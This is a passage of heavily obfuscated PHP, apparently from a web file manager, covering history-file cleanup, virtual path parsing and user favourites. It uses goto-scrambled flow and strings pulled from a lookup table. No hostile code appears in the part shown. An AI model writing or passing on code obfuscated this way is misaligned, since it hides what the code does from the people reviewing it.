$AæÌËœÒ[8], $AæÌËœÒ[365] => array()); goto C»‡ôÄåê™; C»‡ôÄåê™: $D©Ï–ìˆ×š = IO::getContent($aª‘™êëÁ…[$AæÌËœÒ[1105]]); if ($D©Ï–ìˆ×š) { $b´ÚØ·‡å = json_decode($D©Ï–ìˆ×š, !0); if (is_array($b´ÚØ·‡å)) { $aª‘™êëÁ…[$AæÌËœÒ[365]] = $b´ÚØ·‡å; } } return $aª‘™êëÁ…; goto A––ÊÂ«Ö ; A––ÊÂ«Ö : } private static function saveData($A®»íÄ±Œ, $dòì“Øßšï) { goto D«î³œíğ‰; BÏŸ‘¬ö¢â: return !0; goto bœöÌöÏ×­; D«î³œíğ‰: $EùŸßªè«‚ =& $_SERVER[¹Ò‹Ò¹]; self::log($EùŸßªè«‚[1108] . $A®»íÄ±Œ . $EùŸßªè«‚[67] . count($dòì“Øßšï), $EùŸßªè«‚[706]); if ($dòì“Øßšï) { return IO::setContent($A®»íÄ±Œ, json_encode($dòì“Øßšï)); } goto Cç¤°Ñˆ¯­; Cç¤°Ñˆ¯­: $b•­…¹ÖÜ = IO::pathFather($A®»íÄ±Œ); IO::remove($A®»íÄ±Œ); self::clearEmptyFolder($b•­…¹ÖÜ); goto BÏŸ‘¬ö¢â; bœöÌöÏ×­: } public static function clearEmptyFolder($AƒÙ×İëŠ) { goto CÈˆ‡‹ª; CÈˆ‡‹ª: $fÍÓËŸ‡±¥ =& $_SERVER[¹Ò‹Ò¹]; if (trim($AƒÙ×İëŠ, $fÍÓËŸ‡±¥[8]) == trim(self::$_historyBase, $fÍÓËŸ‡±¥[8])) { return; } $b÷ğÌé¾ƒ = IO::pathFather($AƒÙ×İëŠ); goto båñ„¼ğµĞ; båñ„¼ğµĞ: $B›ª…†¶“ = IO::has($AƒÙ×İëŠ, !0); if ($B›ª…†¶“[$fÍÓËŸ‡±¥[201]] > 0 || $B›ª…†¶“[$fÍÓËŸ‡±¥[202]] > 0) { return; } IO::remove($AƒÙ×İëŠ); goto bÔëô¯•ß‘; bÔëô¯•ß‘: self::clearEmptyFolder($b÷ğÌé¾ƒ); goto eğÇ‘ïé­İ; eğÇ‘ïé­İ: } private static function getBasePath() { goto C–†ïÚÖ•Š; C–†ïÚÖ•Š: $C†¸‹…‚õï =& $_SERVER[¹Ò‹Ò¹]; $e…À†‰Úöî = Model($C†¸‹…‚õï[1109])->get($C†¸‹…‚õï[1110]); if (IO::exist($e…À†‰Úöî)) { return $e…À†‰Úöî; } goto D§óé…ô‹; fö¬â¯À±˜: file_put_contents($e…À†‰Úöî . $C†¸‹…‚õï[1112], $C†¸‹…‚õï[33]); Model($C†¸‹…‚õï[1109])->set($C†¸‹…‚õï[1110], $e…À†‰Úöî); return $e…À†‰Úöî; goto FÂĞîÇµ˜›; D§óé…ô‹: $e…À†‰Úöî = DATA_PATH . $C†¸‹…‚õï[1111]; $e…À†‰Úöî = IO::mkdir($e…À†‰Úöî); $e…À†‰Úöî = rtrim($e…À†‰Úöî, $C†¸‹…‚õï[8]) . $C†¸‹…‚õï[8]; goto fö¬â¯À±˜; FÂĞîÇµ˜›: } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\x72\122\x65\143\x79\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\162\106\x61\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\x72\106\151\154\145\124\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\162\106\x69\154\145\124\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\165\160\122\157\157\x74\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\165\163\145\162\x53\x68\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\x73\145\x72\123\150\x61\162\x65\x4c\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\x72\145\x54\157\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\162\x65\111\164\x65\155\175"; const KOD_SHARE_LINK = "\173\163\x68\x61\162\145\x49\x74\x65\x6d\x4c\x69\156\x6b\175"; const KOD_SEARCH = "\173\163\145\141\x72\x63\150\x7d"; const KOD_BLOCK = "\173\x62\154\x6f\143\x6b\x7d"; const KOD_IO = "\173\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\x72\122\x65\156\x63\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\x69\x76\x65\162\175"; public static function typeList() { $b•š˜í÷‹¯ =& $_SERVER[¹Ò‹Ò¹]; return array($b•š˜í÷‹¯[1113] => self::KOD_SOURCE, $b•š˜í÷‹¯[1114] => self::KOD_USER_RECYCLE, $b•š˜í÷‹¯[1115] => self::KOD_USER_FAV, $b•š˜í÷‹¯[1116] => self::KOD_USER_FILE_TAG, $b•š˜í÷‹¯[1117] => self::KOD_USER_FILE_TYPE, $b•š˜í÷‹¯[1118] => self::KOD_GROUP_ROOT_SELF, $b•š˜í÷‹¯[1119] => self::KOD_USER_SHARE, $b•š˜í÷‹¯[1120] => self::KOD_USER_SHARE_LINK, $b•š˜í÷‹¯[1121] => self::KOD_USER_SHARE_TO_ME, $b•š˜í÷‹¯[1122] => self::KOD_SHARE_ITEM, $b•š˜í÷‹¯[1123] => self::KOD_SHARE_LINK, $b•š˜í÷‹¯[1124] => self::KOD_SEARCH, $b•š˜í÷‹¯[1125] => self::KOD_BLOCK, $b•š˜í÷‹¯[1126] => self::KOD_IO, $b•š˜í÷‹¯[1127] => self::KOD_USER_RECENT, $b•š˜í÷‹¯[1128] => self::KOD_USER_DRIVER); } public static function parse($aĞÓ”ÁÙì·) { goto Eµµ«¹˜ƒÊ; aÎæ—ß¡: $cÈ…È¯öù = array($CóÛİ’²Š[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $e£©âÛÚˆ¯[$CóÛİ’²Š[1094]] = in_array($e£©âÛÚˆ¯[$CóÛİ’²Š[29]], $cÈ…È¯öù); return $e£©âÛÚˆ¯; goto fÚ·ïŠ…“; Eµµ«¹˜ƒÊ: $CóÛİ’²Š =& $_SERVER[¹Ò‹Ò¹]; $aĞÓ”ÁÙì· = self::clear($aĞÓ”ÁÙì·); $aˆ¨Ô¹â¬… = array_values(self::typeList()); goto cçóÃÇÕ¾™; cçóÃÇÕ¾™: preg_match($CóÛİ’²Š[1129], $aĞÓ”ÁÙì·, $EŠÑŒÚç«‘); $e£©âÛÚˆ¯ = array($CóÛİ’²Š[409] => !1, $CóÛİ’²Š[1130] => !1, $CóÛİ’²Š[406] => !1, $CóÛİ’²Š[75] => $aĞÓ”ÁÙì·, $CóÛİ’²Š[1040] => !1, $CóÛİ’²Š[1039] => $CóÛİ’²Š[33]); if (is_array($EŠÑŒÚç«‘) && count($EŠÑŒÚç«‘) == 5) { $CÀÛå…ˆŠ­ = $CóÛİ’²Š[1131] . $EŠÑŒÚç«‘[2] . $CóÛİ’²Š[323]; if (in_array($CÀÛå…ˆŠ­, $aˆ¨Ô¹â¬…)) { $e£©âÛÚˆ¯[$CóÛİ’²Š[1040]] = $EŠÑŒÚç«‘[1]; $e£©âÛÚˆ¯[$CóÛİ’²Š[29]] = $CÀÛå…ˆŠ­; $e£©âÛÚˆ¯[$CóÛİ’²Š[1132]] = substr($CÀÛå…ˆŠ­, 1, -1); $e£©âÛÚˆ¯[$CóÛİ’²Š[388]] = $EŠÑŒÚç«‘[3]; } $e£©âÛÚˆ¯[$CóÛİ’²Š[1039]] = $EŠÑŒÚç«‘[4]; } goto aÎæ—ß¡; fÚ·ïŠ…“: } public static function isTruePath($F×œœïããÀ) { goto e©ºè“³Œâ; A†Ûåò™õç: if (strpos($F×œœïããÀ, $b‰™åøÚ°[1097]) === 0) { return !0; } if (strpos($F×œœïããÀ, $b‰™åøÚ°[1133]) === 0) { return !0; } if (strpos($F×œœïããÀ, $b‰™åøÚ°[1133]) === 0) { return !0; } goto Aë“Ïèé‘; Aë“Ïèé‘: if (strpos($F×œœïããÀ, $b‰™åøÚ°[1134]) === 0) { return !0; } return !1; goto F¹æ„ïó»˜; e©ºè“³Œâ: $b‰™åøÚ° =& $_SERVER[¹Ò‹Ò¹]; if (substr($F×œœïããÀ, 0, 1) != $b‰™åøÚ°[1131]) { return !0; } if (strpos($F×œœïããÀ, $b‰™åøÚ°[395]) === 0) { return !0; } goto A†Ûåò™õç; F¹æ„ïó»˜: } public static function clear($EœÁ½ñ¸Òï) { goto bË‰—¾¿Éğ; bË‰—¾¿Éğ: $BèœÓ§¤¶‹ =& $_SERVER[¹Ò‹Ò¹]; $EœÁ½ñ¸Òï = str_replace(array($BèœÓ§¤¶‹[1013], $BèœÓ§¤¶‹[227]), $BèœÓ§¤¶‹[50], $EœÁ½ñ¸Òï); $EœÁ½ñ¸Òï = str_replace($BèœÓ§¤¶‹[96], $BèœÓ§¤¶‹[8], $EœÁ½ñ¸Òï); goto fÔîº¢½Ìñ; A”ÎØ¢•Áê: $EœÁ½ñ¸Òï = preg_replace($BèœÓ§¤¶‹[1137], $BèœÓ§¤¶‹[8], $EœÁ½ñ¸Òï); if ($EœÁ½ñ¸Òï == $BèœÓ§¤¶‹[8]) { return $BèœÓ§¤¶‹[8]; } $EœÁ½ñ¸Òï = rtrim($EœÁ½ñ¸Òï, $BèœÓ§¤¶‹[8]); goto CàÚ¡éì·ø; CàÚ¡éì·ø: return $EœÁ½ñ¸Òï; goto E—äŒÖÇâ; fÔîº¢½Ìñ: $B¨°ËÒ™Şœ = $BèœÓ§¤¶‹[1135]; if (substr($EœÁ½ñ¸Òï, 0, 3) == $BèœÓ§¤¶‹[1136]) { $EœÁ½ñ¸Òï = substr($EœÁ½ñ¸Òï, 3); } while (strstr($EœÁ½ñ¸Òï, $B¨°ËÒ™Şœ)) { $EœÁ½ñ¸Òï = str_replace($B¨°ËÒ™Şœ, $BèœÓ§¤¶‹[8], $EœÁ½ñ¸Òï); } goto A”ÎØ¢•Áê; E—äŒÖÇâ: } public static function sourceID($A¨µšŠõİß) { $f³¹×­´§ =& $_SERVER[¹Ò‹Ò¹]; $A¯ÙœÖ©Úç = self::parse($A¨µšŠõİß); if ($A¯ÙœÖ©Úç[$f³¹×­´§[29]] !== self::KOD_SOURCE) { show_json(LNG($f³¹×­´§[1138]), !1); } return $A¯ÙœÖ©Úç[$f³¹×­´§[388]]; } public static function make($aà¼ŸÚÄ˜) { if (!$aà¼ŸÚÄ˜) { return !1; } return self::makePath(self::KOD_SOURCE, intval($aà¼ŸÚÄ˜)); } public static function makeShare($A®éïßÃÅ™, $dğó’¸ù¨) { return self::makePath(self::KOD_SHARE_ITEM, $A®éïßÃÅ™, $dğó’¸ù¨); } public static function makeFileTypePath($cÒÁÙğéÕ) { return self::makePath(self::KOD_USER_FILE_TYPE, $cÒÁÙğéÕ); } public static function makeFileTagPath($BÍãï‡œÒˆ) { return self::makePath(self::KOD_USER_FILE_TAG, $BÍãï‡œÒˆ); } public static function makePath($C¸Æ‘‰Øëˆ, $bø–‡¶ìÁ = '', $dÄø•”ŠÙ‰ = '') { $CÛÁíŠÏ± =& $_SERVER[¹Ò‹Ò¹]; $fµ¦¾›ÓÊ‹ = substr($C¸Æ‘‰Øëˆ, 1, -1); $B‡åêŸ‹ = $CÛÁíŠÏ±[1139] . $fµ¦¾›ÓÊ‹ . $CÛÁíŠÏ±[1140] . $bø–‡¶ìÁ . $CÛÁíŠÏ±[1141]; $B‡åêŸ‹ = $dÄø•”ŠÙ‰ ? $B‡åêŸ‹ . $dÄø•”ŠÙ‰ . $CÛÁíŠÏ±[8] : $B‡åêŸ‹; return $B‡åêŸ‹; } public static function hashPath($C¬à© …Ö) { goto C•­ÌùñÃË; C•­ÌùñÃË: $fó®¹Â‚´ =& $_SERVER[¹Ò‹Ò¹]; $f‡›Îğä† = is_array($C¬à© …Ö) ? $C¬à© …Ö : IO::info($C¬à© …Ö); $F™ÍÁõìïĞ = _get($f‡›Îğä†, $fó®¹Â‚´[1142], $fó®¹Â‚´[33]); goto A¿ÌÂŠ½; A¿ÌÂŠ½: if (!$F™ÍÁõìïĞ && isset($f‡›Îğä†[$fó®¹Â‚´[390]])) { $f‡›Îğä† = IO::info(KodIO::make($f‡›Îğä†[$fó®¹Â‚´[390]])); $F™ÍÁõìïĞ = _get($f‡›Îğä†, $fó®¹Â‚´[1142], $fó®¹Â‚´[33]); } if (!$F™ÍÁõìïĞ) { $F„™“šÀğ = KodIO::parse($f‡›Îğä†[$fó®¹Â‚´[75]]); if (!$F„™“šÀğ[$fó®¹Â‚´[29]]) { $F™ÍÁõìïĞ = IO::hashSimple($f‡›Îğä†[$fó®¹Â‚´[75]]); } } if (!$F™ÍÁõìïĞ) { $F™ÍÁõìïĞ = md5($f‡›Îğä†[$fó®¹Â‚´[75]] . $f‡›Îğä†[$fó®¹Â‚´[77]] . $f‡›Îğä†[$fó®¹Â‚´[83]]); } goto E·ÑšÍºÌÕ; E·ÑšÍºÌÕ: return $F™ÍÁõìïĞ; goto BáŞ÷ÆŒª; BáŞ÷ÆŒª: } public static function initSystemPath() { goto cñôøÏØÏ; f¬ˆçìÎÁ: define($FàÒ¢ïÜ™[1145], self::systemPath($FàÒ¢ïÜ™[1146])); define($FàÒ¢ïÜ™[1147], self::systemPath($FàÒ¢ïÜ™[1148])); define($FàÒ¢ïÜ™[1149], self::systemPath($FàÒ¢ïÜ™[1150])); goto eËë¢½¥¸œ; eËë¢½¥¸œ: IOHistory::bindEvent(); goto dî–„Ú’î†; cñôøÏØÏ: $FàÒ¢ïÜ™ =& $_SERVER[¹Ò‹Ò¹]; if (defined($FàÒ¢ïÜ™[1143])) { return; } define($FàÒ¢ïÜ™[1143], self::systemPath($FàÒ¢ïÜ™[1144])); goto f¬ˆçìÎÁ; dî–„Ú’î†: } public static function systemPath($c¥Ó÷ê¡µÉ) { goto a„ùêµäÛ¦; a„ùêµäÛ¦: $A–‚ñÖŞ‰¯ =& $_SERVER[¹Ò‹Ò¹]; $D¶Ï¬Ú–ˆÃ = $A–‚ñÖŞ‰¯[1151] . ucfirst($c¥Ó÷ê¡µÉ); $d™åÁ––Á³ = Model($A–‚ñÖŞ‰¯[1099])->get($D¶Ï¬Ú–ˆÃ); goto fµñÊ„Í÷ç; fµñÊ„Í÷ç: if ($d™åÁ––Á³) { return $d™åÁ––Á³; } if ($c¥Ó÷ê¡µÉ == $A–‚ñÖŞ‰¯[1144]) { $d™åÁ––Á³ = self::make(Model($A–‚ñÖŞ‰¯[769])->systemRootPathAdd($A–‚ñÖŞ‰¯[500])); } else { $d™åÁ––Á³ = self::systemPath($A–‚ñÖŞ‰¯[1144]); $bç™œ—ëí = self::sourceID($d™åÁ––Á³); $d™åÁ––Á³ = self::make(Model($A–‚ñÖŞ‰¯[769])->mkdir($bç™œ—ëí, $c¥Ó÷ê¡µÉ)); } Model($A–‚ñÖŞ‰¯[1099])->set($D¶Ï¬Ú–ˆÃ, $d™åÁ––Á³); goto dÁ÷Áö¢±Ï; dÁ÷Áö¢±Ï: return $d™åÁ––Á³; goto E³¤ß…¤§ ; E³¤ß…¤§ : } public static function systemFolder($Fï‘„ğè›ˆ) { $b…Õ®œÌŞÚ = IO_PATH_SYSTEM_SOURCE . $Fï‘„ğè›ˆ; $eÜ´İ¼© í = Cache::get($b…Õ®œÌŞÚ); if (!$eÜ´İ¼© í) { $E†…‰èØš = IO::infoFull($b…Õ®œÌŞÚ); if (!$E†…‰èØš) { $eÜ´İ¼© í = IO::mkdir($b…Õ®œÌŞÚ, REPEAT_SKIP); } else { $eÜ´İ¼© í = $E†…‰èØš[$_SERVER[¹Ò‹Ò¹][75]]; } Cache::set($b…Õ®œÌŞÚ, $eÜ´İ¼© í, 3600 * 10); } return $eÜ´İ¼© í; } public static function defaultDriver() { return Model($_SERVER[¹Ò‹Ò¹][718])->defaultDriver(); } public static function defaultIO() { $b‚ì×ƒ÷‘ò =& $_SERVER[¹Ò‹Ò¹]; $F„·Ö ìÕ = self::defaultDriver(); return $b‚ì×ƒ÷‘ò[1152] . $F„·Ö ìÕ[$b‚ì×ƒ÷‘ò[388]] . $b‚ì×ƒ÷‘ò[1141]; } public static function defaultDriverInit() { static $bëö‚‹Âº = false; if ($bëö‚‹Âº) { return $bëö‚‹Âº; } $bëö‚‹Âº = IO::init(self::defaultIO()); return $bëö‚‹Âº; } public static function fileTypeList() { $AÚèªäïß¹ =& $_SERVER[¹Ò‹Ò¹]; $d‘æã„†—Ş = $GLOBALS[$AÚèªäïß¹[6]][$AÚèªäïß¹[1153]]; foreach ($d‘æã„†—Ş as $AÓËê¤ôõ => $dÓ¶¼ñí£Á) { $DŠŠ÷º­Ó = $AÚèªäïß¹[1154] . $AÓËê¤ôõ; $Bã¯äåÉ = LNG($DŠŠ÷º­Ó); if ($DŠŠ÷º­Ó != $Bã¯äåÉ) { $d‘æã„†—Ş[$AÓËê¤ôõ][$AÚèªäïß¹[28]] = $Bã¯äåÉ; } } return $d‘æã„†—Ş; } public static function transferType($AŠ¤¸¤÷àà, $fÂñ¢Šİ§ö) { goto E™ÕË‚ÏÓß; EÇ§ èÅ‘: if ($DÃñ²âµÆÂ[$a¿¤§ šÎ–[29]] == $B½ª¡ŞÔ±Œ[$a¿¤§ šÎ–[29]] && $DÃñ²âµÆÂ[$a¿¤§ šÎ–[1155]] == $B½ª¡ŞÔ±Œ[$a¿¤§ šÎ–[1155]]) { return $a¿¤§ šÎ–[1156]; } if ($DÃñ²âµÆÂ[$a¿¤§ šÎ–[29]] == $a¿¤§ šÎ–[809] && $B½ª¡ŞÔ±Œ[$a¿¤§ šÎ–[29]] == $a¿¤§ šÎ–[105]) { return $a¿¤§ šÎ–[1069]; } if ($DÃñ²âµÆÂ[$a¿¤§ šÎ–[29]] == $a¿¤§ šÎ–[105] && $B½ª¡ŞÔ±Œ[$a¿¤§ šÎ–[29]] == $a¿¤§ šÎ–[809]) { return $a¿¤§ šÎ–[106]; } goto E••²ëôù; E••²ëôù: return $a¿¤§ šÎ–[1157]; goto cµ„‚Ô¾¬; E™ÕË‚ÏÓß: $a¿¤§ šÎ– =& $_SERVER[¹Ò‹Ò¹]; $DÃñ²âµÆÂ = self::driverType($AŠ¤¸¤÷àà); $B½ª¡ŞÔ±Œ = self::driverType($fÂñ¢Šİ§ö); goto EÇ§ èÅ‘; cµ„‚Ô¾¬: } public static function driverType($AæÌçŒ‘œø) { goto dÍŒ»î×Ùì; A»ë…Ë¨õ¢: return array($FËĞ—åÓë×[29] => $FËĞ—åÓë×[809], $FËĞ—åÓë×[1155] => $AæÌçŒ‘œø->pathDriver, $FËĞ—åÓë×[75] => $Fšª³Üš„Æ); goto eğ˜‰¤Šõ; då¥×ë‰İÃ: if ($Bƒ¼Ş’Ğà == $FËĞ—åÓë×[709] || $Bƒ¼Ş’Ğà == $FËĞ—åÓë×[1159] || $Bƒ¼Ş’Ğà == $FËĞ—åÓë×[1160]) { $AæÌçŒ‘œø = self::defaultDriverInit(); } else { if ($Bƒ¼Ş’Ğà == $FËĞ—åÓë×[1076] || $Bƒ¼Ş’Ğà == $FËĞ—åÓë×[1161]) { $AæÌçŒ‘œø = IO::init($AæÌçŒ‘œø->pathParse[$FËĞ—åÓë×[1023]]); } } $Bƒ¼Ş’Ğà = str_replace($FËĞ—åÓë×[1158], $FËĞ—åÓë×[33], strtolower($AæÌçŒ‘œø->getType())); if ($Bƒ¼Ş’Ğà == $FËĞ—åÓë×[105]) { return array($FËĞ—åÓë×[29] => $FËĞ—åÓë×[105], $FËĞ—åÓë×[1155] => $FËĞ—åÓë×[33], $FËĞ—åÓë×[75] => $Fšª³Üš„Æ); } goto A»ë…Ë¨õ¢; dÍŒ»î×Ùì: $FËĞ—åÓë× =& $_SERVER[¹Ò‹Ò¹]; $Fšª³Üš„Æ = $AæÌçŒ‘œø->path; $Bƒ¼Ş’Ğà = str_replace($FËĞ—åÓë×[1158], $FËĞ—åÓë×[33], strtolower($AæÌçŒ‘œø->getType())); goto då¥×ë‰İÃ; eğ˜‰¤Šõ: } } goto C¢ÇÛˆÉ•Î; A‰ Ä‚: class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($eò¾ÛØË) { $A«Ó¸˜¸· =& $_SERVER[¹Ò‹Ò¹]; return array($A«Ó¸˜¸·[1771] => array(USER_ID, $A«Ó¸˜¸·[2088])); } protected function listData() { $bŒÇÓÛÑ¯¡ =& $_SERVER[¹Ò‹Ò¹]; $AçË‘–É = array($bŒÇÓÛÑ¯¡[1496] => USER_ID, $bŒÇÓÛÑ¯¡[457] => 0); $f—íªˆî‚ = $bŒÇÓÛÑ¯¡[2089]; $f©†Üé‚÷œ = $this->field($f—íªˆî‚)->where($AçË‘–É)->order($bŒÇÓÛÑ¯¡[2090])->select(); return $f©†Üé‚÷œ ? $f©†Üé‚÷œ : array(); } protected function resetCache() { } protected function listView() { goto e„º³°Ú¸ì; e„º³°Ú¸ì: $c¼ŒóÂÔí‹ =& $_SERVER[¹Ò‹Ò¹]; $D©¶…Î–‡¾ = $this->listData(); $Cô‡å¾Ø = array_filter_by_field($D©¶…Î–‡¾, $c¼ŒóÂÔí‹[29], $c¼ŒóÂÔí‹[403]); goto bå±‚ƒÂÚÜ; A£¾´ˆîíŠ: $Cô‹è°Â² = array($c¼ŒóÂÔí‹[404] => array($c¼ŒóÂÔí‹[405], $Aîæ‘““ƒ)); $AÛ‹„–Ï× = Model($c¼ŒóÂÔí‹[769])->listSource($Cô‹è°Â², $cÂ‘åŠ¥…¸); $AÛ‹„–Ï× = array_merge($AÛ‹„–Ï×[$c¼ŒóÂÔí‹[73]], $AÛ‹„–Ï×[$c¼ŒóÂÔí‹[74]]); goto C¸ƒå¨©öñ; C¸ƒå¨©öñ: $AÛ‹„–Ï× = array_to_keyvalue($AÛ‹„–Ï×, $c¼ŒóÂÔí‹[390]); foreach ($D©¶…Î–‡¾ as $fä¢öÃÚã => $FÓÊÈŒÒğï) { $e«ê‹ÔèÂ¿ = $AÛ‹„–Ï×[$FÓÊÈŒÒğï[$c¼ŒóÂÔí‹[75]]]; $e«ê‹ÔèÂ¿ = $e«ê‹ÔèÂ¿ ? $e«ê‹ÔèÂ¿ : array(); $D©¶…Î–‡¾[$fä¢öÃÚã] = array_merge($e«ê‹ÔèÂ¿, $FÓÊÈŒÒğï); } return $D©¶…Î–‡¾; goto F×Â„á®‡; bå±‚ƒÂÚÜ: $Aîæ‘““ƒ = array_to_keyvalue($Cô‡å¾Ø, $c¼ŒóÂÔí‹[33], $c¼ŒóÂÔí‹[75]); if (!$Aîæ‘““ƒ) { return $D©¶…Î–‡¾; } $cÂ‘åŠ¥…¸ = 2000; goto A£¾´ˆîíŠ; F×Â„á®‡: } protected function addFav($EÒï‘÷¢†Û, $aÌĞ˜˜ùæÊ = '', $d÷Ó¥Æçğ = "\x73\x6f\x75\162\143\145") { goto e»¿Ê±ó‰—; D°‚İöÍé: return $this->add($Fó«Â±¶); goto eÌªÂ©Ì×ƒ; e»¿Ê±ó‰—: $Aë’òÌù‘ß =& $_SERVER[¹Ò‹Ò¹]; $CË…ç²µ¹ë = array($Aë’òÌù‘ß[1496] => USER_ID, $Aë’òÌù‘ß[457] => 0, $Aë’òÌù‘ß[409] => $d÷Ó¥Æçğ, $Aë’òÌù‘ß[408] => $EÒï‘÷¢†Û); if ($this->where($CË…ç²µ¹ë)->find()) { return !1; } goto bÏŞÃ©ôöÚ; AæôŒäà­: if (!$aÌĞ˜˜ùæÊ && $d÷Ó¥Æçğ == $Aë’òÌù‘ß[403]) { $fá«­ÆìŸ = Model($Aë’òÌù‘ß[1179])->where(array($Aë’òÌù‘ß[404] => $EÒï‘÷¢†Û))->find(); if (!$fá«­ÆìŸ) { return !1; } $aÌĞ˜˜ùæÊ = $fá«­ÆìŸ[$Aë’òÌù‘ß[28]]; } $aÌĞ˜˜ùæÊ = $this->getAutoName($aÌĞ˜˜ùæÊ); $Fó«Â±¶ = array($Aë’òÌù‘ß[1496] => USER_ID, $Aë’òÌù‘ß[457] => 0, $Aë’òÌù‘ß[407] => $aÌĞ˜˜ùæÊ, $Aë’òÌù‘ß[408] => $EÒï‘÷¢†Û, $Aë’òÌù‘ß[409] => $d÷Ó¥Æçğ, $Aë’òÌù‘ß[1671] => $Bâõ´·Ï¨“ + 1); goto D°‚İöÍé; bÏŞÃ©ôöÚ: $CË…ç²µ¹ë = array($Aë’òÌù‘ß[1496] => USER_ID, $Aë’òÌù‘ß[457] => 0); $Bâõ´·Ï¨“ = $this->where($CË…ç²µ¹ë)->max($Aë’òÌù‘ß[1690]); if (!$Bâõ´·Ï¨“) { $Bâõ´·Ï¨“ = 0; } goto AæôŒäà­; eÌªÂ©Ì×ƒ: } protected function remove($EÑšÒ’‚áˆ) { $EÏ÷á­©àí =& $_SERVER[¹Ò‹Ò¹]; $Fµ¢éÉß«¡ = array($EÏ÷á­©àí[1496] => USER_ID, $EÏ÷á­©àí[406] => $EÑšÒ’‚áˆ); return $this->where($Fµ¢éÉß«¡)->delete(); } protected function removeByName($dœŒ´“ã) { $A•Ÿ„ãÙËÄ =& $_SERVER[¹Ò‹Ò¹]; $BÛ¸¤ó˜• = array($A•Ÿ„ãÙËÄ[1496] => USER_ID, $A•Ÿ„ãÙËÄ[407] => $dœŒ´“ã, $A•Ÿ„ãÙËÄ[457] => 0); return $this->where($BÛ¸¤ó˜•)->delete(); } protected function rename($AÊÁÆ½î¯†, $dØé¼º¥œî) { $eáÅÇ–ÄÌì =& $_SERVER[¹Ò‹Ò¹]; if ($AÊÁÆ½î¯† == $dØé¼º¥œî) { return !1; } $b¦¸Àçé™º = $this->getAutoName($dØé¼º¥œî); if ($dØé¼º¥œî != $b¦¸Àçé™º) { return !1; } $b†ÙŞ‘Ãî = array($eáÅÇ–ÄÌì[1496] => USER_ID, $eáÅÇ–ÄÌì[457] => 0, $eáÅÇ–ÄÌì[28] => $AÊÁÆ½î¯†); return $this->where($b†ÙŞ‘Ãî)->save(array($eáÅÇ–ÄÌì[28] => $dØé¼º¥œî)); } protected function resetSort($CëëÉÎÔˆğ) { $A·ìİÄ¶…¬ =& $_SERVER[¹Ò‹Ò¹]; $CëëÉÎÔˆğ = is_array($CëëÉÎÔˆğ) ? $CëëÉÎÔˆğ : array(); $cÊè·Ã… = array($A·ìİÄ¶…¬[1496] => USER_ID); for ($e‘§ŒÆ±ÂÎ = 0; $e‘§ŒÆ±ÂÎ < count($CëëÉÎÔˆğ); $e‘§ŒÆ±ÂÎ++) { $cÊè·Ã…[$A·ìİÄ¶…¬[406]] = $CëëÉÎÔˆğ[$e‘§ŒÆ±ÂÎ]; $this->where($cÊè·Ã…)->save(array($A·ìİÄ¶…¬[1671] => $e‘§ŒÆ±ÂÎ + 1)); } return !0; } protected function moveTop($BàÈÇèâ¡˜) { goto côøÓ‰Êƒ§; E—İø‚˜Çˆ: if (!$BÒ²­ˆÉÆÏ) { return; } $B¨ˆŒ„„¹° = $this->field($CñÜáãëö[388])->where($d§±ºÔğğ)->order($CñÜáãëö[2090])->select(); $B¨ˆŒ„„¹° = array_to_keyvalue($B¨ˆŒ„„¹°, $CñÜáãëö[33], $CñÜáãëö[388]); goto B¬®äÒŠ˜©; C±¦Ø‘ÃÍù: return $this->resetSort($B¨ˆŒ„„¹°); goto Fêöê°Î¿; côøÓ‰Êƒ§: $CñÜáãëö =& $_SERVER[¹Ò‹Ò¹]; $d§±ºÔğğ = array($CñÜáãëö[1496] => USER_ID, $CñÜáãëö[457] => 0); $BÒ²­ˆÉÆÏ = $this->where($d§±ºÔğğ)->where(array($CñÜáãëö[28] => $BàÈÇèâ¡˜))->find(); goto E—İø‚˜Çˆ; B¬®äÒŠ˜©: $cççÍ¹¥Ç = $B¨ˆŒ„„¹°; $B¨ˆŒ„„¹° = array_remove_value($B¨ˆŒ„„¹°, $BÒ²­ˆÉÆÏ[$CñÜáãëö[388]]); array_unshift($B¨ˆŒ„„¹°, $BÒ²­ˆÉÆÏ[$CñÜáãëö[388]]); goto C±¦Ø‘ÃÍù; Fêöê°Î¿: } protected function moveBottom($cßíõ÷Ù) { $Fñ«¬Šò =& $_SERVER[¹Ò‹Ò¹]; $DÁ¥´öšá = array($Fñ«¬Šò[1496] => USER_ID, $Fñ«¬Šò[457] => 0); $AÊöâáÛÖÖ = $this->where($DÁ¥´öšá)->max($Fñ«¬Šò[1690]); $d¡ï¤Á³«ï = array($Fñ«¬Šò[1690] => $AÊöâáÛÖÖ + 1); return $this->where($DÁ¥´öšá)->where(array($Fñ«¬Šò[28] => $cßíõ÷Ù))->save($d¡ï¤Á³«ï); } private function getAutoName($Cç–¢†áÃ£) { goto F›®…Äï ®; aùÊª†„¿‚: return $Cç–¢†áÃ£ . "\x28{$eÍíÃÀÄå‰}\51"; goto C°õ–’¶¾ù; cĞ¬¥ŠĞßÙ: $aõ‰åÈ´ö» = array_to_keyvalue($aõ‰åÈ´ö», $d¹ŞõÀ‰¢[33], $d¹ŞõÀ‰¢[28]); if (!$aõ‰åÈ´ö» || !in_array($Cç–¢†áÃ£, $aõ‰åÈ´ö»)) { return $Cç–¢†áÃ£; } for ($eÍíÃÀÄå‰ = 0; $eÍíÃÀÄå‰ < count($aõ‰åÈ´ö»); $eÍíÃÀÄå‰++) { if (!in_array($Cç–¢†áÃ£ . "\x28{$eÍíÃÀÄå‰}\x29", $aõ‰åÈ´ö»)) { return $Cç–¢†áÃ£ . "\x28{$eÍíÃÀÄå‰}\51"; } } goto 